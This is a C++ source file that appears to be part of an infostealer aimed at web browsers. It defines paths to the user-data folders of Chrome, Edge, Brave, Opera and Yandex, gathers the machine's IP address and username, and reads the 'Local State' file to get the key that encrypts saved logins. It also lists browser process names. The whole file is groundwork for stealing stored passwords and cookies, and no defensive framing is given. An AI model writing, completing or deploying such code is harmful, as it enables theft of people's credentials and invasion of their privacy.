#include "../includes.h"

namespace definitions {
    std::string ip;
    std::string home;
    std::string username;
    std::string browser;
    std::string localstate_path;
    std::string localstate_content;
    bool blank_password = false;  // Initialize default value
    std::string decoded_key_str;
    std::string encoded_key_str;
    std::vector<std::string> browser_proccess;

    //list of all browser dirs
    std::map<std::string, std::string> browser_paths = {
        {"Chrome", std::getenv("USERPROFILE") + std::string("\\AppData\\Local\\Google\\Chrome\\User Data\\")},
        {"Chrome_Beta", std::getenv("USERPROFILE") + std::string("\\AppData\\Local\\Google\\Chrome Beta\\User Data\\")},
        {"Edge", std::getenv("USERPROFILE") + std::string("\\AppData\\Local\\Microsoft\\Edge\\User Data\\")},
        {"Brave", std::getenv("USERPROFILE") + std::string("\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\")},
        {"Opera", std::getenv("USERPROFILE") + std::string("\\AppData\\Roaming\\Opera Software\\Opera Stable\\")}, //Why tf does opera install to \\Roaming?? wtf opera.
        {"Opera GX", std::getenv("USERPROFILE") + std::string("\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\")},
        {"Yandex", std::getenv("USERPROFILE") + std::string("\\AppData\\Local\\Yandex\\YandexBrowser\\")},
    };

    void initialize() {
        ip = get_ip();  // Call the function from main.cpp
        home = std::getenv("USERPROFILE"); // Get user profile
        username = home.substr(home.find_last_of("\\") + 1);  // Extract username from the path
        auto main_browser = browser_paths.begin();
        browser = main_browser->second; //Browser Path
        localstate_path = browser + "Local State";   // Local State file path - needed for base64 key
        localstate_content = read_file_utf8(localstate_path);  // Read the content of the Local State file
        browser_proccess = {
        "chrome.exe",
        "brave.exe",
        "opera.exe", //idk if this is correct
        "msedge.exe",//TODO: FIX EXE NAMES
        "yandex.exe",
        "operaGX.exe",
        "chromebeta.exe"
        };
    }
}